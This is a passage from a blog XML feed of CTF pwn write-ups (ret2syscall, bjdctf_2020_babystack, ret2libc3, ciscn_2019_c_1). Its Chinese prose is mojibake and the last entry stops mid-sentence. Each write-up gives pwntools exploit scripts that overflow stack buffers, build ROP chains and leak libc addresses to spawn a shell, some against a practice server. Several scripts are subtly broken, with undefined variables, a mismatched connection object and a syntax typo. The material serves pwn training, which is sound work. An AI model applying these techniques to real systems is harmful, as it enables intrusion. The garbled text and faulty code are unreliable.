<p>è¿™ä¸ªå¯ä»¥ç›´æ¥æ§åˆ¶å…¶å®ƒä¸‰ä¸ªå¯„å­˜å™¨ã€‚</p>
<p>è¿˜è¦è·å–&#x2F;bin&#x2F;shçš„åœ°å€0x80BE408</p>
<p><img data-src="https://pic4.zhimg.com/80/v2-6141708a6cddca7ad9fd374297af1fe3_1440w.webp"></p>
<p>è¿˜æœ‰int 0x80çš„åœ°å€  0x08049421 </p>
<p><img data-src="https://pic4.zhimg.com/80/v2-ff0f310e66188f0ab84f3f516e986ee7_1440w.webp"></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>å¯ä»¥å†™expäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./rop&quot;)</span><br><span class="line">pop_eax_ret = 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line"></span><br><span class="line">payload = flat([b&#x27;A&#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</span><br><span class="line">#åç§»é‡çš„è®¡ç®—æ–¹æ³•å’Œret2textçš„ç›¸åŒ</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>è¡¥å……ä¸€äº›ç³»ç»Ÿè°ƒç”¨çš„ç›¸å…³çŸ¥è¯†</p>
<p>Linux åœ¨x86ä¸Šçš„ç³»ç»Ÿè°ƒç”¨é€šè¿‡ int 80h å®ç°ï¼Œç”¨ç³»ç»Ÿè°ƒç”¨å·ï¼ˆåœ¨ &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h å’Œ &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h åˆ†åˆ«å¯ä»¥æŸ¥çœ‹ 64 ä½å’Œ 32 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚ï¼‰æ¥åŒºåˆ†å…¥å£å‡½æ•°ã€‚</p>
<p>æ“ä½œç³»ç»Ÿå®ç°ç³»ç»Ÿè°ƒç”¨çš„åŸºæœ¬è¿‡ç¨‹æ˜¯ï¼š</p>
<ol>
<li>åº”ç”¨ç¨‹åºè°ƒç”¨åº“å‡½æ•°ï¼ˆAPIï¼‰ï¼›</li>
<li>API å°†ç³»ç»Ÿè°ƒç”¨å·å­˜å…¥ EAXï¼Œç„¶åé€šè¿‡ä¸­æ–­è°ƒç”¨ä½¿ç³»ç»Ÿè¿›å…¥å†…æ ¸æ€ï¼›</li>
<li>å†…æ ¸ä¸­çš„ä¸­æ–­å¤„ç†å‡½æ•°æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·ï¼Œè°ƒç”¨å¯¹åº”çš„å†…æ ¸å‡½æ•°ï¼ˆç³»ç»Ÿè°ƒç”¨ï¼‰ï¼›</li>
<li>ç³»ç»Ÿè°ƒç”¨å®Œæˆç›¸åº”åŠŸèƒ½ï¼Œå°†è¿”å›å€¼å­˜å…¥ EAXï¼Œè¿”å›åˆ°ä¸­æ–­å¤„ç†å‡½æ•°ï¼›</li>
<li>ä¸­æ–­å¤„ç†å‡½æ•°è¿”å›åˆ° API ä¸­ï¼›</li>
<li>API å°† EAX è¿”å›ç»™åº”ç”¨ç¨‹åº</li>
</ol>
<p>åº”ç”¨ç¨‹åºè°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹æ˜¯ï¼š</p>
<ol>
<li>æŠŠç³»ç»Ÿè°ƒç”¨çš„ç¼–å·å­˜å…¥ EAXï¼›</li>
<li>æŠŠå‡½æ•°å‚æ•°å­˜å…¥å…¶å®ƒé€šç”¨å¯„å­˜å™¨ï¼›</li>
<li>è§¦å‘ 0x80 å·ä¸­æ–­ï¼ˆint 0x80ï¼‰</li>
</ol>
<p>Linuxåœ¨ç”¨int 0x80è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œè°ƒç”¨å·å­˜åœ¨äºEAXï¼Œç¬¬ä¸€ä¸ªå‚æ•°å­˜åœ¨äºEBXï¼Œç¬¬äºŒä¸ªå‚æ•°å­˜åœ¨äºECXï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å­˜åœ¨äºEDX</p>
<p>æ›´å¤šç³»ç»Ÿè°ƒç”¨å·å¯å‚è€ƒ    å‚è€ƒæ–‡ç« </p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://blog.csdn.net/weixin_44864859/article/details/106213446">ret2syscallçŸ¥è¯†ç‚¹åŠä¾‹é¢˜</a><br><a href="https://blog.csdn.net/qq_33769475/article/details/121953414#:~:text=%E6%AD%A4%E6%AC%A1%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E4%BB%AC%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%80%E6%AE%B5%E4%BB%A3%E7%A0%81%E6%88%96%E8%80%85%E8%87%AA%E5%B7%B1%E5%A1%AB%E5%86%99%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%8E%B7%E5%BE%97%20shell%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%20gadgets%20%E6%9D%A5%E8%8E%B7%E5%BE%97,shell%EF%BC%8C%E8%80%8C%E5%AF%B9%E5%BA%94%E7%9A%84%20shell%20%E8%8E%B7%E5%8F%96%E5%88%99%E6%98%AF%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E3%80%82%20%E9%87%87%E5%8F%96%E4%BD%BF%E7%94%A8ret2syscall%E5%8D%B3%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%8C%E8%8E%B7%E5%8F%96%20shell%E3%80%82">ret2syscall</a><br><a href="https://www.cnblogs.com/gsharpsh00ter/p/6402104.html">Linuxç³»ç»Ÿè°ƒç”¨å· - gsharpsh00ter - åšå®¢å›­ (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week6-T1</title>
    <url>/posts/c63e16b3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Week-6-T1-bjdctf-2020-babystack"><a href="#Week-6-T1-bjdctf-2020-babystack" class="headerlink" title="Week 6 T1 bjdctf_2020_babystack"></a>Week 6 T1 bjdctf_2020_babystack</h2><blockquote>
<p>2023-02-05WP<br>BUUCTF pwn ç¬¬åä¸€é¢˜<br>è€ƒç‚¹ï¼šret2text</p>
</blockquote>
<span id="more"></span>

<p>çœç•¥ç¬¬ä¸€æ­¥â€¦â€¦åªå¼€äº†NX</p>
<blockquote>
<p>__isoc99_scanf(â€œ%dâ€, &amp;nbytes)    è®©ç”¨æˆ·è¾“å…¥ä¸‹æ¬¡è¾“å…¥æ—¶æ¥å—çš„æ•°æ®çš„é•¿åº¦</p>
</blockquote>
<blockquote>
<p>read(0, &amp;buf, (unsigned int)nbytes)   ç”¨æˆ·å¯ä»¥æ§åˆ¶é•¿åº¦ï¼Œå®ç°æ ˆæº¢å‡º</p>
</blockquote>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>æ‰“å¼€IDA</p>
<p><img data-src="https://img-blog.csdnimg.cn/20200802192521891.png"></p>
<p>æ‰¾åˆ°æœ‰&#x2F;bin&#x2F;sh<br>æ‰¾åˆ°åé—¨å‡½æ•°</p>
<p><img data-src="https://img-blog.csdnimg.cn/20200802192937904.png"></p>
<p>bufå ç”¨çš„ç©ºé—´ä¸º0x10</p>
<p><img data-src="https://img-blog.csdnimg.cn/20200802192913332.png"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,29891)</span><br><span class="line"></span><br><span class="line">backdoor_addr = 0x4006e6</span><br><span class="line"></span><br><span class="line">payload =b &#x27;a&#x27; * (0x10+8) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;100&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>å‘ç°è¿™æ ·ä¹Ÿä¸é”™ï¼Œäº¤ç»™å·¥å…·æ¥æ‰¾åœ°å€</p>
<p><img data-src="https://img-blog.csdnimg.cn/4d3c024d108c4bbd85c7ef85fd505712.png"></p>
<ul>
<li>å˜é‡(unsigned int)nbytesç”¨æˆ·å¯æ§ï¼Œä¸”æ˜¯ä¸ªæ— ç¬¦å·å‡½æ•°</li>
<li><strong>å¯ç”¨-1è¿›è¡Œç»•è¿‡</strong>ï¼Œè¿™æ ·ç”¨æˆ·å¯è¾“å…¥çš„æ•°æ®é•¿åº¦å°±ååˆ†å·¨å¤§äº†</li>
<li>æ¥ç€è°ƒç”¨backdoor()å³å¯getshell</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#start</span><br><span class="line"># r = process(&quot;../buu/bjdctf_2020_babystack&quot;)</span><br><span class="line">r = remote(&quot;node4.buuoj.cn&quot;,29891)</span><br><span class="line">elf = ELF(&quot;../buu/bjdctf_2020_babystack&quot;)</span><br><span class="line"></span><br><span class="line">#params</span><br><span class="line">backdoor_addr = elf.symbols[&#x27;backdoor&#x27;]</span><br><span class="line"></span><br><span class="line">#attack</span><br><span class="line">r.recvuntil(b&quot;your name:&quot;)</span><br><span class="line">r.sendline(&quot;-1&quot;)</span><br><span class="line">r.recvuntil(b&quot;name?&quot;)</span><br><span class="line">payload = b&#x27;M&#x27; * (0x10 + 8) + p64(backdoor_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week4&amp;&amp;week5-T4</title>
    <url>/posts/e234b4c5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2libc3"><a href="#T4-ret2libc3" class="headerlink" title="T4 ret2libc3"></a>T4 ret2libc3</h2><blockquote>
<p>2021-01-30WP<br>ctf-wiki ret2libc3<br>è€ƒç‚¹ï¼šæ ˆæº¢å‡ºrop</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>è¿™ä¸ªæ˜¯çœŸçš„éš¾â€¦â€¦  é¦–å…ˆå¾—é€å½»ç†è§£gotå’Œpltï¼Œå…¶æ¬¡è¿˜å¾—å¯¹expçš„å†™ä½œè¦æœ‰ä¸€å®šçš„ç†Ÿç»ƒåº¦ï¼Œè€Œä¸”è¿˜æœ‰å„ç§å„æ ·å¤æ€ªçš„å†™æ³•â€¦â€¦ ç°åœ¨æˆ‘è¿˜å¾ˆå¤šåœ°æ–¹ç¢ç£¨ä¸æ¸…æ¥šï¼Œåªæ˜¯ä¾è‘«èŠ¦ç”»ç“¢åœ°å¤ç›˜äº†ä¸€ä¸‹ï¼Œç°åœ¨è¿™ç¯‡é¢˜è§£åªæ˜¯å†™ä¸ªå¤§æ¡†æ¶ï¼Œå…·ä½“ç»†èŠ‚åé¢æ…¢æ…¢è¡¥å……äº†â€¦â€¦</p>
<p>file checksec â€”â€” 32-bit å¼€NX</p>
<p><img data-src="https://pic2.zhimg.com/80/v2-39081f4041a6adc22d72564532642699_1440w.webp"></p>
<p>æ¼æ´å’Œå†…å­˜åˆ†æå’Œä¹‹å‰çš„ç³»åˆ—é¢˜ç±»ä¼¼ï¼Œä¸èµ˜è¿°äº†</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDAçœ‹æºç ï¼Œæ—¢æ²¡æœ‰systemä¹Ÿæ²¡æœ‰binsh </p>
<p><img data-src="https://img-blog.csdnimg.cn/fe4f5738bcd04e6fbe3cd80ed056f189.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>ç”±linuxå»¶è¿Ÿç»‘å®šæœºåˆ¶çš„çŸ¥è¯†ï¼ˆåé¢å†å†™ä¸€ç¯‡æ€»ç»“å§ï¼‰å¯çŸ¥ï¼Œæˆ‘ä»¬å¦‚æœè¦è°ƒç”¨systemå‡½æ•°ï¼Œå°±è¦çŸ¥é“ä»–çš„gotè¡¨ä¸­çš„åœ°å€ï¼Œä½†libcè¢«åŠ è½½åˆ°çš„å†…å­˜çš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæˆ‘ä»¬æ— æ³•å¾—çŸ¥<br>ä¸è¿‡ï¼ŒåŒä¸€ç‰ˆæœ¬çš„libcçš„ä¸¤ä¸ªåº“å‡½æ•°åœ¨libcä¸­çš„ç›¸å¯¹ä½ç½®æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„gotè¡¨åœ°å€ï¼Œç„¶åç¡®å®šlibcçš„ç‰ˆæœ¬ï¼Œå°±å¯ä»¥åŠ ä¸Šå’Œsystemå‡½æ•°çš„åç§»ï¼Œä»è€Œå¾—åˆ°systemå‡½æ•°çš„çœŸå®åœ°å€ï¼ˆgotè¡¨åœ°å€ï¼‰<br>è€Œç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªputså‡½æ•°ï¼Œlibcä¸­ä¹Ÿæœ‰systemå’Œbinsh</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>æˆ‘ä»¬åªéœ€è¦é€šè¿‡æ ˆæº¢å‡ºåˆ©ç”¨putså‡½æ•°ï¼Œæ‰“å°putså‡½æ•°çš„gotè¡¨ä¸­çš„åœ°å€ï¼Œç„¶åè·å–åç§»ï¼Œå¾—åˆ°systemå‡½æ•°å’Œ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œå†å°†putså‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºsystemå‡½æ•°çš„åœ°å€å³å¯<br>æˆ‘ä»¬å¯ä»¥å…ˆè¿è¡Œexp1ï¼ˆè§0x04ï¼‰æ‹¿åˆ°è·å–putsçš„çœŸå®åœ°å€ï¼Œç„¶åå»<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -searchçš„ç½‘ç«™</a>æŸ¥è¯¢ï¼Œå¯å¾—åˆ°putså‡½æ•°systemå‡½æ•°å’Œbinshå­—ç¬¦ä¸²å¯¹åº”çš„åç§»åœ°å€</p>
<p><img data-src="https://img-blog.csdnimg.cn/66db2c69d62a4149868ab50a5c933698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>ï¼ˆè¿™é‡Œç›´æ¥ç›—å›¾äº†â€¦â€¦ï¼‰</p>
<p>çŸ¥é“äº†putså‡½æ•°çš„çœŸå®åœ°å€å’Œåç§»ä¹‹åï¼Œå°±å¯ä»¥å°†putså‡½æ•°çš„çœŸå®åœ°å€å‡å»åç§»åœ°å€ï¼Œå¾—åˆ°libcçš„åŸºå€ï¼Œå°†libcçš„åŸºå€åˆ†åˆ«ä¸systemï¼Œ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„åç§»ç›¸åŠ ï¼Œå°±å¯ä»¥å¾—åˆ°å¯¹åº”çš„çœŸå®åœ°å€<br>ç„¶åå†™å®Œæ•´çš„exp </p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>æ‰€ä»¥å…¶å®expæ˜¯åˆ†ä¸¤éƒ¨çš„ï¼Œç¬¬ä¸€æ­¥æ˜¯æ„é€ æ ˆæº¢å‡ºåˆ©ç”¨putså‡½æ•°æ‰“å°å‡ºçœŸå®åœ°å€ï¼›ç¬¬äºŒæ­¥æ˜¯æº¢å‡ºè¦†ç›–è‡³systemå‡½æ•°å’Œ&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œæ‹¿åˆ°shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#first exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;ret2libc3&#x27;)</span><br><span class="line">p=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line">print(&quot;puts addr = &quot;, hex(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#second exp</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(&quot;puts_addr = &quot;,hex(puts_addr))</span><br><span class="line">sys_offset = 0x03cd10</span><br><span class="line">puts_offset = 0x067360</span><br><span class="line">sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">#æ ¹æ®å…¬å¼  libcåŸºåœ°å€  +  å‡½æ•°åç§»é‡   =  å‡½æ•°çœŸå®åœ°å€   æ¥è®¡ç®—</span><br><span class="line">libc_base_addr = puts_addr - puts_offset #è®¡ç®—å‡ºlibcåŸºåœ°å€</span><br><span class="line">sys_addr = libc_base_addr + sys_offset #è®¡ç®—å‡ºsystemçš„çœŸå®åœ°å€</span><br><span class="line">sh_addr = libc_base_addr + sh_offset #è®¡ç®—å‡º/bin/shçš„çœŸå®åœ°å€</span><br><span class="line"></span><br><span class="line">print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))</span><br><span class="line">print(&quot;sys_addr = &quot;,hex(sys_addr))</span><br><span class="line">print(&quot;sh_addr = &quot;,hex(sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>è¿˜æœ‰å…¶ä»–å‡ ç§æ–¹æ³•ç›®å‰æ²¡ç”¨ææ‡‚<br>ä¹‹åå­¦ä¼šäº†ï¼ˆçœ‹æ‡‚äº†ï¼‰å†å†™è¿‡<br><strong>é—®</strong>ï¼š</p>
<blockquote>
<p>p.recv()[0:4]å’Œp.recv(4ï¼‰çš„åŒºåˆ«ï¼Ÿï¼Ÿ<br>ç½‘ä¸Šæ²¡æœåˆ°<br>è¦åœ¨æœ¬åœ°æ‰“é€šæ˜¯ä¸æ˜¯è¦å¯¹libcåšä»€ä¹ˆæ“ä½œå‘€</p>
</blockquote>
<p>å‚è€ƒèµ„æ–™ï¼š<br>  <a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwnå°ç™½å…¥é—¨06â€“ret2libc</a><br>  <a href="https://blog.csdn.net/AcSuccess/article/details/104335514">åŸºæœ¬ROPä¹‹ret2libc3</a><br>  <a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichenäºŒè¿›åˆ¶å®‰å…¨</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week4&amp;&amp;week5-T5</title>
    <url>/posts/95338453/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-ciscn-2019-c-1"><a href="#T5-ciscn-2019-c-1" class="headerlink" title="T5 ciscn_2019_c_1"></a>T5 ciscn_2019_c_1</h2><blockquote>
<p>2023-01-30WP<br>BUUCTF pwn é¢˜<br>è€ƒç‚¹ï¼šæ ˆæº¢å‡º ret2libc3</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>è¿™ä¸ä¸Šä¸€é¢˜åˆšåšè¿™ç±»ï¼Ÿç›´æ¥æ¨¡ä»¿ä¸€æ‰‹ã€‚ã€‚ã€‚ã€‚<br>file checksec â€”â€” 64-bit å¼€NX</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>è¿è¡Œä¸€ä¸‹çœ‹çœ‹</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-8b7794a415c00fa88ea4eab73b44e060_1440w.webp"></p>
<p>å†çœ‹çœ‹IDA</p>
<p><img data-src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
<p>ç ”ç©¶äº†åŠå¤©å‘ç°æ˜¯è®©ä½ åŠ è§£å¯†çš„<br>å†çœ‹çœ‹string window æ²¡ç”¨systemå’Œbinsh<br>åˆå‘ç°åŠ å¯†å‡½æ•°é‡Œæœ‰getså‡½æ•°ï¼Œå¯æ„æˆæ ˆæº¢å‡º</p>
<p><img data-src="https://img-blog.csdnimg.cn/20200825172042284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>åˆ†æ  æ˜¯ç›¸åŒçš„æ€æƒ³ï¼Œè¿™é‡Œä¸èµ˜è¿°äº†ï¼Œå¤§è‡´æµç¨‹å°±æ˜¯</p>
<ol>
<li>åˆ©ç”¨ä¸€ä¸ªç¨‹åºå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°å»æ³„éœ²å®ƒåœ¨ç¨‹åºä¸­çš„åœ°å€ï¼Œç„¶åå–æœ«å°¾3ä¸ªå­—èŠ‚ï¼Œå»æ‰¾åˆ°è¿™ä¸ªç¨‹åºæ‰€ä½¿ç”¨çš„libcçš„ç‰ˆæœ¬</li>
<li>ç”¨åŒä¸€ä¸ªç¨‹åºé‡Œå‡½æ•°çš„åœ°å€-libcé‡Œçš„å‡½æ•°åœ°å€å³å¯å¾—åˆ°åç§»é‡</li>
<li>å¾—åˆ°åç§»é‡åå°±å¯ä»¥æ¨ç®—å‡ºç¨‹åºä¸­å…¶ä»–å‡½æ•°çš„åœ°å€ï¼ŒçŸ¥é“å…¶ä»–å‡½æ•°çš„åœ°å€ä¹‹åå°±å¯ä»¥å»æ‰§è¡Œsystemï¼ˆâ€™&#x2F;bin&#x2F;shâ€˜ï¼‰</li>
</ol>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>å†™exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28342)</span><br><span class="line">elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)</span><br><span class="line"></span><br><span class="line">main=0x400b28</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line">ret=0x4006b9</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>çš„githubç½‘å€<br>å®‰è£…</p>
<blockquote>
<p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p>
</blockquote>
<p>è¦†ç›–æ•°æ®payload&#x3D;bâ€™\0â€™+bâ€™aâ€™*(0x50-1+8)<br>\0æ˜¯ä¸ºäº†è®©åŠ å¯†å‡½æ•°çš„ä¸€ä¸ªstrlenå‡½æ•°åœæ­¢ï¼ˆè¿™ä¸ªå‡½æ•°é‡â€˜0â€™ä¼šåœæ­¢ï¼‰ï¼Œä»è€Œç»•è¿‡åŠ å¯†ï¼Œä¿è¯æˆ‘ä»¬æ„é€ çš„ropä¸ä¼šè¢«ç ´åï¼Œ<br>bufçš„å¤§å°ä¸º0x50<br>-1æ˜¯å‡å»\0<br>+8æ˜¯è¦†ç›–rbp</p>
<p>è¿™é“é¢˜çš„æ¥æ”¶éå¸¸è®²ç©¶<br>æ³„éœ²åœ°å€æ¥æ”¶æ—¶å…ˆæ˜¯ä¸¤ä¸‹recvline()ï¼Œ<br>åŸå› </p>
<blockquote>
